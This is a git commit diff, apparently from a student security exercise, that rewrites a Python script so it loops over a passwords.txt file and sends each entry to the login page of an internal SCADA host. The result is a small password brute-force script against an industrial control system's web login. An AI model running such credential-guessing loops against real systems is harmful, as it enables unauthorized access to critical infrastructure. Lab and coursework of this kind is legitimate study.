ef157c7c95dd638f0d6c5797f015f493e239e652
Lucas96Mireles <Lucas96Mireles@gmail.com>
2019-01-22 15:26:59 -0500

    task 4 sfter wireshark

--- Project/Task 3,4/Task4.py
+++ Project/Task 3,4/Task4.py
@@ -5,23 +5,26 @@
 
 from socket	import * 
 import sys
-
+import requests
 import time
 import random
 
-dest_ip = "10.12.1.244"	# scada.m4i.local 
-dest_port = 80	# web based
-source_ip = "10.204.0.13"
-clientSocket = socket(AF_INET, SOCK_STREAM)
-clientSocket.connect((dest_ip, dest_port))
 
-#passwords = open("passwords.txt", "r")
 
-#for password in passwords:
-#	message = "GET /login.php?command={} HTTP/1.1\r\n".format(password)
-#	clientSocket.send(message.encode())
-#	time.sleep(0.1) #dont overload buffer
-message = "GET /login.php?command={} HTTP/1.1\r\n\r\n".format("password")
-clientSocket.send(message.encode())
-sentence = input("press enter to close socket")
-clientSocket.close()
+#dest_ip = "10.12.1.244"	# scada.m4i.local 
+#dest_port = 80	# web based
+#source_ip = "10.204.0.13"
+#clientSocket = socket(AF_INET, SOCK_STREAM)
+#clientSocket.connect((dest_ip, dest_port))
+#
+passwords = open("passwords.txt", "r")
+#
+for password in passwords:
+	ihatemylife = requests.get("http://scada.m4i.local//login.php?command={}".format(password))
+	#message = "GET /login.php?command={} HTTP/1.1\r\n".format(password)
+	#clientSocket.send(message.encode())
+	#time.sleep(0.1) #dont overload buffer
+#message = "GET /login.php?command={} HTTP/1.1\r\n\r\n".format("password")
+#clientSocket.send(message.encode())
+#sentence = input("press enter to close socket")
+#clientSocket.close()
